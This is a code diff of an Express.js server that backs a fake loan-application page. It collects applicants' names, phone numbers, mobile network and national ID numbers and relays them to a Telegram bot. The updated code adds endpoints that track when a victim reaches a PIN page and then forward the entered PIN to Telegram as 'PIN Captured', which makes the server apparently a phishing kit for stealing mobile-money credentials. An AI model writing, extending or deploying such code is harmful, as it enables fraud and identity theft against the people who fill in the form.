@@ -1,180 +1,134 @@
 const express = require("express");
 const axios = require("axios");
 const path = require("path");
-const mongoose = require("mongoose");
 
 const app = express();
 
+// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
 
-// ENV
+// ENV VARIABLES (set in Railway)
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const MONGO_URI = process.env.MONGO_URI;
-
-// ================= DB CONNECT =================
-let dbConnected = false;
-
-if (MONGO_URI) {
-  mongoose.connect(MONGO_URI)
-    .then(() => {
-      dbConnected = true;
-      console.log("MongoDB connected");
-    })
-    .catch(err => console.log("MongoDB error:", err.message));
-}
-
-// ================= MODEL =================
-const userSchema = new mongoose.Schema({
-  name: String,
-  phone: { type: String, unique: true },
-  network: String,
-  amount: String,
-  nationalId: String,
-  status: { type: String, default: "pending" }
-});
-
-const User = mongoose.model("User", userSchema);
 
 // ================= HOME =================
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// ================= TEST =================
-app.get("/test", (req, res) => {
-  res.json({ ok: true });
-});
-
-// ================= APPLY (FIXED) =================
+// ================= APPLY =================
 app.post("/apply", async (req, res) => {
-  try {
-    const { name, phone, network, amount, nationalId } = req.body;
+  const { name, phone, network, amount, nationalId } = req.body;
 
-    if (!name || !phone || !network || !amount || !nationalId) {
-      return res.status(400).json({ success: false });
-    }
+  if (!name || !phone || !network || !amount || !nationalId) {
+    return res.status(400).send("Missing fields");
+  }
 
-    console.log("Apply received:", phone);
+  // Save phone for later (simple method)
+  const message = `
+📥 NEW LOAN APPLICATION
 
-    // SAFE DB SAVE
-    if (dbConnected) {
-      try {
-        await User.findOneAndUpdate(
-          { phone },
-          { name, phone, network, amount, nationalId, status: "pending" },
-          { upsert: true, new: true }
-        );
-      } catch (dbErr) {
-        console.log("DB error (ignored):", dbErr.message);
-      }
-    }
+👤 Name: ${name}
+📱 Phone: ${phone}
+📡 Network: ${network}
+💰 Amount: ${amount}
+🆔 ID: ${nationalId}
 
-    // ================= FIXED TELEGRAM (BUTTONS RESTORED) =================
-    if (BOT_TOKEN && CHAT_ID) {
-      const message = `
-📥 NEW APPLICATION
-
-👤 ${name}
-📱 ${phone}
-📡 ${network}
-💰 ${amount}
-🆔 ${nationalId}
+-------------------------
+⚙️ Action Required:
 `;
 
-      try {
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          chat_id: CHAT_ID,
-          text: message,
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: "✅ Approve", callback_data: `approve_${phone}` },
-                { text: "❌ Decline", callback_data: `decline_${phone}` }
-              ]
-            ]
-          }
-        });
-      } catch (tgErr) {
-        console.log("Telegram error:", tgErr.message);
+  try {
+    // Send with buttons
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: message,
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Approve", callback_data: `approve_${phone}` },
+            { text: "❌ Decline", callback_data: `decline_${phone}` }
+          ]
+        ]
       }
-    }
+    });
 
-    return res.json({ success: true, phone });
-
+    res.sendStatus(200);
   } catch (err) {
-    console.log("APPLY ERROR:", err.message);
-    return res.status(500).json({ success: false });
+    console.log(err.response?.data || err.message);
+    res.status(500).send("Telegram failed");
   }
 });
 
-// ================= STATUS =================
-app.get("/status/:phone", async (req, res) => {
+// ================= PIN PAGE VISIT =================
+app.post("/pin-step", async (req, res) => {
+  const { phone } = req.body;
+
   try {
-    if (!dbConnected) {
-      return res.json({ status: "pending" });
-    }
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: `📍 USER REACHED PIN STEP\n📱 ${phone}`
+    });
 
-    const user = await User.findOne({ phone: req.params.phone });
-    return res.json({ status: user ? user.status : "pending" });
-
+    res.sendStatus(200);
   } catch (err) {
-    return res.status(500).json({ status: "error" });
+    res.sendStatus(500);
+  }
+});
+
+// ================= PIN SUBMIT =================
+app.post("/pin", async (req, res) => {
+  const { phone, pin } = req.body;
+
+  try {
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: `
+🔐 PIN RECEIVED
+
+📱 Phone: ${phone}
+🔑 PIN: ${pin}
+
+✅ Status: PIN Captured
+`
+    });
+
+    res.sendStatus(200);
+  } catch (err) {
+    res.sendStatus(500);
   }
 });
 
 // ================= WEBHOOK =================
-app.post("/webhook", async (req, res) => {
-  try {
-    if (!req.body.callback_query) return res.sendStatus(200);
+app.post("/webhook", (req, res) => {
+  const data = req.body;
 
-    const action = req.body.callback_query.data;
-    const phone = action.split("_")[1];
+  if (data.callback_query) {
+    const query = data.callback_query;
+    const action = query.data;
 
-    const status = action.startsWith("approve") ? "approved" : "declined";
+    let text = "";
 
-    if (dbConnected) {
-      await User.findOneAndUpdate({ phone }, { status });
+    if (action.startsWith("approve")) {
+      text = "✅ Approved\n➡️ Next: PIN Page";
+    } else if (action.startsWith("decline")) {
+      text = "❌ Declined";
     }
 
-    if (BOT_TOKEN && CHAT_ID) {
-      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        chat_id: CHAT_ID,
-        text: `Status updated: ${phone} → ${status}`
-      });
-    }
-
-    res.sendStatus(200);
-
-  } catch (err) {
-    console.log("WEBHOOK ERROR:", err.message);
-    res.sendStatus(200);
+    // Respond back in Telegram
+    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: text
+    });
   }
+
+  res.sendStatus(200);
 });
 
-// ================= PIN STEP =================
-app.post("/pin-step", async (req, res) => {
-  try {
-    const { phone } = req.body;
-
-    if (BOT_TOKEN && CHAT_ID) {
-      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        chat_id: CHAT_ID,
-        text: `PIN STEP: ${phone}`
-      });
-    }
-
-    res.sendStatus(200);
-
-  } catch (err) {
-    res.sendStatus(200);
-  }
-});
-
-// ================= START =================
+// ================= START SERVER =================
 const PORT = process.env.PORT || 8080;
-app.listen(PORT, () => {
+app.listen(PORT, "0.0.0.0", () => {
   console.log("Server running on port " + PORT);
 });
